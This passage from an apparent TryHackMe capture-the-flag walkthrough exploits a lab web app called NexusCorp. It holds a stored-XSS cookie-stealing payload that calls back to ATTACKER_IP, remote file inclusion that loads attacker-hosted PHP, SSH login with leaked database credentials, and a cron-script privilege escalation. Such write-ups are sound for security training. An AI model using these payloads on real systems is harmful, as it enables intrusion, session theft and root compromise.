      <p><strong>0</strong> unread tickets</p>    </div>
  </div>
</div>
</body>
</html>
```

The captured flag is **THM{bl1nd_x55_s3ss10n_h1j4ck_fl4g2}**.

#### Path 2: XSS Session Hijack

> [!NOTE]
> This path is sufficient to obtain the second flag but is included as a supplementary exploitation route, as JWT forgery from Path 1 is required to discover the vulnerability associated with the third flag.

Inspect the session cookie in `cookies.txt` to determine whether the `HttpOnly` attribute is set. In `curl`'s Netscape cookie-jar format, a `HttpOnly` cookie is prefixed with `#HttpOnly_` before the target domain. Since this prefix is absent from the `nexus_session` entry, the cookie is not marked as `HttpOnly` and may therefore be accessible to `JavaScript` through `document.cookie`. This makes cookie theft through a potential stored XSS vulnerability in the support ticket functionality. 

```bash
root@ip-ATTACKER_IP:~# cat cookies.txt 
# Netscape HTTP Cookie File
# https://curl.se/docs/http-cookies.html
# This file was generated by libcurl! Edit at your own risk.

TARGET_IP	FALSE	/	FALSE	0	nexus_session	eyJ1c2VyX2lkIjo0LCJ1c2VybmFtZSI6InJvYmVydC53aWxzb24iLCJyb2xlIjoidXNlciJ9.06633788837d4525fc57614def8718cf061a8374b95120eb93aedfd74eb4cee3
```

Inspect `support/create.php` to discover nothing out of the ordinary.

```bash
root@ip-ATTACKER_IP:~# curl -b cookies.txt -X GET http://TARGET_IP/support/create.php
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>New Ticket - NexusCorp</title>
<link rel="stylesheet" href="/static/style.css">
</head>
<body>
<nav class="navbar">
  <div class="nav-brand"><span class="logo-icon">&#9650;</span> NexusCorp</div>
  <div class="nav-links">
    <a href="/dashboard.php">Dashboard</a>
    <a href="/support/index.php">Support</a>
    <a href="/logout.php">Logout</a>
  </div>
</nav>
<div class="container">
  <h1>Open Support Ticket</h1>
      <div class="card">
    <form method="POST" action="/support/create.php">
      <div class="form-group">
        <label>Subject</label>
        <input type="text" name="subject" placeholder="Brief description of your issue" required>
      </div>
      <div class="form-group">
        <label>Message</label>
        <textarea name="message" rows="8" placeholder="Describe your issue in detail..." required></textarea>
      </div>
      <button type="submit" class="btn-primary">Submit Ticket</button>
      <a href="/support/index.php" class="btn-secondary">Cancel</a>
    </form>
  </div>
</div>
</body>
</html>
```

Upon submitting a test ticket, one may observe that it is immediately marked as `reviewed` at `/support/index.php`, but does not display the message. The `JavaScript` may be executed automatically. Start a `nc` listener.

```bash
root@ip-ATTACKER_IP:~# nc -lvnp 80
Listening on 0.0.0.0 80
```
In another terminal, try submitting a callback ticket to `ATTACKER_IP`.

```bash
root@ip-ATTACKER_IP:~# curl -o /dev/null -b cookies.txt -sX POST http://TARGET_IP/support/create.php --data-urlencode 'subject=subject' --data-urlencode 'message=<script>new Image().src="http://ATTACKER_IP:80/"</script>'
```

Observe the response, which includes a session cookie. Save and decode it to reveal it as the session cookie of admin `laura.hayes`.

```bash
root@ip-ATTACKER_IP:~# nc -lvnp 80
Listening on 0.0.0.0 80
Connection received on TARGET_IP 32976
GET / HTTP/1.1
Host: ATTACKER_IP
User-Agent: python-requests/2.31.0
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
Cookie: nexus_session=eyJ1c2VyX2lkIjogMSwgInVzZXJuYW1lIjogImxhdXJhLmhheWVzIiwgInJvbGUiOiAiYWRtaW4ifQ==.2d1632df0b5a19cc9a8db3b2e72e612b0110c4e4aaed1265006b8c0bc73f6834
root@ip-ATTACKER_IP:~# ADMINSESSION=$'eyJ1c2VyX2lkIjogMSwgInVzZXJuYW1lIjogImxhdXJhLmhheWVzIiwgInJvbGUiOiAiYWRtaW4ifQ==.2d1632df0b5a19cc9a8db3b2e72e612b0110c4e4aaed1265006b8c0bc73f6834'
root@ip-ATTACKER_IP:~# echo $ADMINSESSION
eyJ1c2VyX2lkIjogMSwgInVzZXJuYW1lIjogImxhdXJhLmhheWVzIiwgInJvbGUiOiAiYWRtaW4ifQ==.2d1632df0b5a19cc9a8db3b2e72e612b0110c4e4aaed1265006b8c0bc73f6834
root@ip-ATTACKER_IP:~# echo $ADMINSESSION | cut -d '.' -f1 | base64 -d 
{"user_id": 1, "username": "laura.hayes", "role": "admin"}
```

Use this stolen session cookie to access the admin panel.

```html
root@ip-ATTACKER_IP:~# curl -H "Cookie: nexus_session=$ADMINSESSION" -iX GET http://TARGET_IP/admin/
HTTP/1.1 200 OK
Date: Tue, 10 Nov 2026 15:21:11 GMT
Server: Apache/2.4.58 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 1315
Content-Type: text/html; charset=UTF-8

<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Admin Panel - NexusCorp</title>
<link rel="stylesheet" href="/static/style.css">
</head>
<body>
<nav class="navbar">
  <div class="nav-brand"><span class="logo-icon">&#9650;</span> NexusCorp Admin</div>
  <div class="nav-links">
    <a href="/dashboard.php">Portal</a>
    <a href="/logout.php">Logout</a>
  </div>
</nav>
<div class="container">
  <div class="admin-header">
    <h1>Administration Console</h1>
    <p>Logged in as: <strong>laura.hayes</strong></p>
  </div>
  <div class="flag-box">
    <h3>System Status</h3>
    <p>Internal reference: <code>THM{bl1nd_x55_s3ss10n_h1j4ck_fl4g2}</code></p>
  </div>
  <div class="card-grid">
    <div class="card">
      <h3>User Management</h3>
      <p>Manage employee accounts and permissions.</p>
      <a href="/api/users/profile.php?id=1" class="btn-secondary">View User API</a>
    </div>
    <div class="card">
      <h3>File System Access</h3>
      <p>Internal document viewer via authenticated API.</p>
      <p><small>GET /api/files.php?name=[path] with Bearer token</small></p>
    </div>
    <div class="card">
      <h3>Support Queue</h3>
      <p>Pending tickets requiring admin review.</p>
      <p><strong>0</strong> unread tickets</p>    </div>
  </div>
</div>
</body>
</html>
```

The captured flag is **THM{bl1nd_x55_s3ss10n_h1j4ck_fl4g2}**.

> [!INFO]
> The forged JWT token from Path 1 can be used to verify the XSS vulnerability from Path 2 by inspecting `/support/create.php`. 
> ```php
> <?php
> require_once __DIR__ . '/../auth.php';
> $user = require_login();
> $msg = '';
> $error = '';
> if ($_SERVER['REQUEST_METHOD'] === 'POST') {
>     $subject = trim($_POST['subject'] ?? '');
>     $message = trim($_POST['message'] ?? '');
>     if ($subject && $message) {
>         $db = get_db();
>         // Message stored raw - no XSS filtering (intentional vulnerability)
>         $stmt = $db->prepare('INSERT INTO tickets (user_id, subject, message) VALUES (?, ?, ?)');
>         $stmt->execute([$user['id'], $subject, $message]);
>         $msg = 'Ticket submitted successfully. An admin will review it shortly.';
>     } else {
>         $error = 'Subject and message are required.';
>     }
> }
> ?>
> <!DOCTYPE html>
> <html lang="en">
> <head>
> <meta charset="UTF-8">
> <title>New Ticket - NexusCorp</title>
> <link rel="stylesheet" href="/static/style.css">
> </head>
> <body>
> <nav class="navbar">
>   <div class="nav-brand"><span class="logo-icon">&#9650;</span> NexusCorp</div>
>   <div class="nav-links">
>     <a href="/dashboard.php">Dashboard</a>
>     <a href="/support/index.php">Support</a>
>     <a href="/logout.php">Logout</a>
>   </div>
> </nav>
> <div class="container">
>   <h1>Open Support Ticket</h1>
>   <?php if ($error): ?><div class="alert alert-danger"><?= htmlspecialchars($error) ?></div><?php endif; ?>
>   <?php if ($msg): ?><div class="alert alert-success"><?= htmlspecialchars($msg) ?></div><?php endif; ?>
>   <div class="card">
>     <form method="POST" action="/support/create.php">
>       <div class="form-group">
>         <label>Subject</label>
>         <input type="text" name="subject" placeholder="Brief description of your issue" required>
>       </div>
>       <div class="form-group">
>         <label>Message</label>
>         <textarea name="message" rows="8" placeholder="Describe your issue in detail..." required></textarea>
>       </div>
>       <button type="submit" class="btn-primary">Submit Ticket</button>
>       <a href="/support/index.php" class="btn-secondary">Cancel</a>
>     </form>
>   </div>
> </div>
> </body>
> </html>
> ```

###  What is the flag obtained after achieving remote code execution on the server? Flag is stored in /opt/flag3.txt

Unfortunately directly retrieving `/opt/flag3.txt` or any other file outside of `/var/www/html/` is not allowed.

```bash
root@ip-ATTACKER_IP:~# curl -b cookies.txt -H "Authorization: Bearer $ADMINTOKEN" -sX GET http://TARGET_IP/api/files.php?name=../opt/flag3.txt                        
{"error":"Access denied: path must be within \/var\/www\/html\/"}
```

Inspect `/api/files.php` to discover that remote `URL`s to `.php` files will be fetched and executed; this is a potential RCE vulnerability. 

```php
root@ip-ATTACKER_IP:~# curl -b cookies.txt -H "Authorization: Bearer $ADMINTOKEN" -sX GET http://TARGET_IP/api/files.php?name=files.php | jq -r '.content'
<?php
require_once __DIR__ . "/../auth.php";
header("Content-Type: application/json");

$jwt_payload = null;
if (isset($_SERVER["HTTP_AUTHORIZATION"])) {
    $auth = $_SERVER["HTTP_AUTHORIZATION"];
    if (strpos($auth, "Bearer ") === 0) {
        $jwt_payload = verify_jwt(substr($auth, 7));
    }
}

if (!$jwt_payload) {
    http_response_code(401);
    echo json_encode(["error" => "JWT token required. Get one from /api/auth/token.php"]);
    exit;
}

if (($jwt_payload["role"] ?? "") !== "admin") {
    http_response_code(403);
    echo json_encode(["error" => "Admin JWT required. Check your token payload."]);
    exit;
}

$name = $_GET["name"] ?? "";
if (!$name) {
    http_response_code(400);
    echo json_encode(["error" => "Missing name parameter", "usage" => "/api/files.php?name=/var/www/html/filename.txt"]);
    exit;
}

// RFI: fetch remote URL and eval as PHP (allow_url_fopen enabled)
if (strpos($name, "http://") === 0 || strpos($name, "https://") === 0) {
    $remote = @file_get_contents($name);
    if ($remote === false) {
        http_response_code(502);
        echo json_encode(["error" => "Could not fetch remote file"]);
        exit;
    }
    ob_start();
    eval(str_replace("<?php", "", $remote));
    $output = ob_get_clean();
    echo json_encode(["output" => $output]);
    exit;
}

// Security check: resolve real path to prevent ../ traversal
$real = realpath($name);
if ($real === false || strpos($real, '/var/www/html/') !== 0) {
    http_response_code(403);
    echo json_encode(["error" => "Access denied: path must be within /var/www/html/"]);
    exit;
}

if (!file_exists($real)) {
    http_response_code(404);
    echo json_encode(["error" => "File not found: " . $real]);
    exit;
}

$content = file_get_contents($real);
echo json_encode(["file" => $real, "content" => $content]);
```

Create a simple `.php` file to read the flag and host it on a `python` server.

```bash
root@ip-ATTACKER_IP:~# cat > rce.php <<'EOF'
<?php
echo file_get_contents('/opt/flag3.txt');
?>
EOF
root@ip-ATTACKER_IP:~# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Request this `.php` through `/api/files.php`.

```bash
root@ip-ATTACKER_IP:~# curl -b cookies.txt -H "Authorization: Bearer $ADMINTOKEN" -X GET http://TARGET_IP/api/files.php?name=http://ATTACKER_IP:80/rce.php                   
{"output":"THM{rf1_2_rc3_f00th0ld_fl4g3}\n"}
```

The captured flag is **THM{rf1_2_rc3_f00th0ld_fl4g3}**.

###  What is the flag found in the devops user's home directory? 

Inspect `config.php` to discover database configuration and the secrets used for signatures. 

```php
root@ip-ATTACKER_IP:~# curl -b cookies.txt -H "Authorization: Bearer $ADMINTOKEN" -sX GET http://TARGET_IP/api/files.php?name=../config.php | jq -r '.content'
<?php
define('DB_HOST', 'localhost');
define('DB_NAME', 'nexusdb');
define('DB_USER', 'app_user');
define('DB_PASS', 'D3v0ps!2024');
define('JWT_SECRET', 'nexus_jwt_s3cr3t_2024');
define('APP_SECRET', 'nexus_app_k3y_2024');

function get_db() {
    $pdo = new PDO('mysql:host='.DB_HOST.';dbname='.DB_NAME, DB_USER, DB_PASS);
    $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
    return $pdo;
}
?>
```

Inspect `auth.php` to determine how the newly discovered secrets are used. The JWT generation function contains a bug that hardcodes the `role` claim to `user`, regardless of the account's actual privileges, hence Path 1. More importantly, signature verification in `verify_jwt()` has been commented out, allowing modified token claims to be accepted without a valid signature. Although the session signing secret has also been recovered, modifying the session cookie's `role` claim is insufficient to escalate privileges because the application retrieves the user's actual `role` from the database rather than trusting the cookie value.

```php
root@ip-ATTACKER_IP:~# curl -b cookies.txt -H "Authorization: Bearer $ADMINTOKEN" -sX GET http://TARGET_IP/api/files.php?name=../auth.php | jq -r '.content'
<?php
require_once __DIR__ . '/config.php';

function get_session() {
    if (!isset($_COOKIE['nexus_session'])) return null;
    $raw = $_COOKIE['nexus_session'];
    // Cookie format: base64(json).hmac_sha256(base64(json), APP_SECRET)
    $parts = explode('.', $raw, 2);
    if (count($parts) !== 2) return null;
    $expected_sig = hash_hmac('sha256', $parts[0], APP_SECRET);
    if (!hash_equals($expected_sig, $parts[1])) return null;
    $decoded = base64_decode($parts[0]);
    $data = json_decode($decoded, true);
    if (!$data || !isset($data['user_id'])) return null;
    // Role always fetched from DB - cookie role value ignored
    $db = get_db();
    $stmt = $db->prepare('SELECT id, username, email, role FROM users WHERE id = ?');
    $stmt->execute([$data['user_id']]);
    return $stmt->fetch(PDO::FETCH_ASSOC);
}

function require_login() {
    $user = get_session();
    if (!$user) { header('Location: /index.php'); exit; }
    return $user;
}

function require_admin() {
    $user = require_login();
    if ($user['role'] !== 'admin') {
        http_response_code(403);
        header('Content-Type: application/json');
        echo json_encode(['error' => 'Forbidden']);
        exit;
    }
    return $user;
}

function generate_jwt($username) {
    $header = rtrim(base64_encode(json_encode(['alg'=>'HS256','typ'=>'JWT'])), '=');
    // Bug: role always set to "user" regardless of actual user role
    $payload = rtrim(base64_encode(json_encode([
        'sub' => $username,
        'role' => 'user',
        'iat' => time(),
        'exp' => time() + 3600
    ])), '=');
    $sig = rtrim(base64_encode(hash_hmac('sha256', "$header.$payload", JWT_SECRET, true)), '=');
    return "$header.$payload.$sig";
}

function verify_jwt($token) {
    $parts = explode('.', $token);
    if (count($parts) !== 3) return null;
    $payload = json_decode(base64_decode($parts[1]), true);
    if (!$payload) return null;
    // Signature check intentionally disabled
    // $expected = rtrim(base64_encode(hash_hmac('sha256', "$parts[0].$parts[1]", JWT_SECRET, true)),'=');
    // if (!hash_equals($parts[2], $expected)) return null;
    if (isset($payload['exp']) && $payload['exp'] < time()) return null;
    return $payload;
}
?>
```

Recall that the system username `devops` was discovered earlier. Connect to the `SSH` service running on port `22` using this username and authenticate with the password `D3v0ps!2024`.

```bash
root@ip-ATTACKER_IP:~# ssh devops@TARGET_IP
The authenticity of host 'TARGET_IP (TARGET_IP)' can't be established.
ED25519 key fingerprint is SHA256:nl++0pDyo2rdpUMZw22wiWlCKTCODSkChhEDJ4OELwg.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'TARGET_IP' (ED25519) to the list of known hosts.
devops@TARGET_IP's password: 
Welcome to Ubuntu 24.04.4 LTS (GNU/Linux 6.17.0-1015-aws x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of 

  System load:  0.13              Temperature:           -273.1 C
  Usage of /:   6.6% of 72.63GB   Processes:             117
  Memory usage: 20%               Users logged in:       0
  Swap usage:   0%                IPv4 address for ens5: TARGET_IP

 * Ubuntu Pro delivers the most comprehensive open source security and
   compliance features.

   https://ubuntu.com/aws/pro

Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: 
devops@tryhackme-2404:~$ whoami
devops
devops@tryhackme-2404:~$ id
uid=1001(devops) gid=1001(devops) groups=1001(devops)
devops@tryhackme-2404:~$ ls
user.txt
devops@tryhackme-2404:~$ cat user.txt 
THM{s5h_cr3d_r3u53_l4t3r4l_fl4g4}
```

The captured flag is **THM{s5h_cr3d_r3u53_l4t3r4l_fl4g4}**.

###  What is the root flag?

The location of `flag3.txt` in `/opt/` makes the directory worth investigating for other useful files. `/opt/admin_bot.py` automatically reviewed support tickets in Path 2 while `/opt/tools/pspy64` can be used to monitor running processes. `/opt/monitoring/health_report.sh` presents a potential privilege-escalation vulnerability. The script performs system health checks and writes the results to `/var/log/nexus_health.log`. It is owned by `root` but group-writable by `devops`, suggesting that it may be possible to modify the script and influence its execution. The key is to determine whether it runs automatically and whether that execution occurs with root privileges.

```bash
devops@tryhackme-2404:~$ ls -l /opt/
total 20
drwxrwxr-x 2 ubuntu   ubuntu   4096 Apr 29  2026 __pycache__
-rwxrwxrwx 1 root     root     1870 May  7  2026 admin_bot.py
-rw-r--r-- 1 www-data www-data   30 Apr 29  2026 flag3.txt
drwxr-xr-x 2 root     root     4096 Apr 29  2026 monitoring
drwxr-xr-x 2 root     root     4096 Apr 30  2026 tools
devops@tryhackme-2404:~$ ls -l /opt/tools/
total 3032
-rwxr-xr-x 1 root root 3104768 Apr 30  2026 pspy64
devops@tryhackme-2404:~$ ls -l /opt/monitoring/
total 4
-rwxrwxr-- 1 root devops 537 May 18 10:41 health_report.sh
devops@tryhackme-2404:~$ cat /opt/monitoring/health_report.sh 
#!/bin/bash
# NexusCorp Health Monitoring Script
LOG_FILE="/var/log/nexus_health.log"
TIMESTAMP=$(date "+%Y-%m-%d %H:%M:%S")
echo "[$TIMESTAMP] Health check started" >> "$LOG_FILE"
systemctl is-active --quiet apache2 && echo "[$TIMESTAMP] Apache: OK" >> "$LOG_FILE" || echo "[$TIMESTAMP] Apache: DOWN" >> "$LOG_FILE"
systemctl is-active --quiet mysql && echo "[$TIMESTAMP] MySQL: OK" >> "$LOG_FILE" || echo "[$TIMESTAMP] MySQL: DOWN" >> "$LOG_FILE"
DISK=$(df -h / | awk "NR==2{print \$5}")
echo "[$TIMESTAMP] Disk: $DISK" >> "$LOG_FILE"
```

`/opt/tools/pspy64` confirms that `/opt/monitoring/health_report.sh` is executed by `root` every minute through `CRON`. 

```bash
devops@tryhackme-2404:~$ /opt/tools/pspy64 
pspy - version: v1.2.1 - Commit SHA: f9e6a1590a4312b9faa093d8dc84e19567977a6d


     ██▓███    ██████  ██▓███ ▓██   ██▓
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  
                   ░           ░ ░     
                               ░ ░     

Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scanning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
Draining file system events due to startup...
done
...
CMD: UID=0     PID=2507   | ps -e -o pid,ppid,state,command 
CMD: UID=0     PID=2508   | /usr/sbin/CRON -f -P 
CMD: UID=0     PID=2509   | /usr/sbin/CRON -f -P 
CMD: UID=0     PID=2510   | /bin/sh -c /opt/monitoring/health_report.sh 
CMD: UID=0     PID=2511   | /bin/bash /opt/monitoring/health_report.sh 
CMD: UID=0     PID=2512   | systemctl is-active --quiet apache2 
CMD: UID=0     PID=2513   | /bin/bash /opt/monitoring/health_report.sh 
CMD: UID=0     PID=2514   | /bin/bash /opt/monitoring/health_report.sh 
CMD: UID=0     PID=2516   | /bin/bash /opt/monitoring/health_report.sh 
CMD: UID=0     PID=2515   | 
CMD: UID=0     PID=2517   | ps -e -o pid,ppid,state,command 
CMD: UID=0     PID=2518   | /usr/sbin/CRON -f -P 
CMD: UID=0     PID=2519   | /usr/sbin/CRON -f -P 
CMD: UID=0     PID=2520   | /bin/sh -c /opt/monitoring/health_report.sh 
CMD: UID=0     PID=2521   | /bin/bash /opt/monitoring/health_report.sh 
CMD: UID=0     PID=2522   | /bin/bash /opt/monitoring/health_report.sh 
CMD: UID=0     PID=2523   | /bin/bash /opt/monitoring/health_report.sh 
CMD: UID=0     PID=2525   | 
CMD: UID=0     PID=2524   | /bin/bash /opt/monitoring/health_report.sh 
CMD: UID=0     PID=2526   | /bin/bash /opt/monitoring/health_report.sh 
```

Modify `/opt/monitoring/health_report.sh` to read `/root/root.txt`, then wait for a minute before checking the updated log. Although other modifications could be used to obtain `root` access or copy the flag to a readable location, this approach is straightforward and requires minimal changes, albeit leaving extra evidence in the log file.

```bash
devops@tryhackme-2404:~$ echo 'cat /root/root.txt >> "$LOG_FILE"' >> /opt/monitoring/health_report.sh
devops@tryhackme-2404:~$ tail -n 10 /var/log/nexus_health.log
[] Health check started
[] Apache: OK
[] MySQL: OK
[] Disk: 7%
THM{pr1v3sc_cr0n_r00t_fl4g5}
```

The captured flag is **THM{pr1v3sc_cr0n_r00t_fl4g5}**.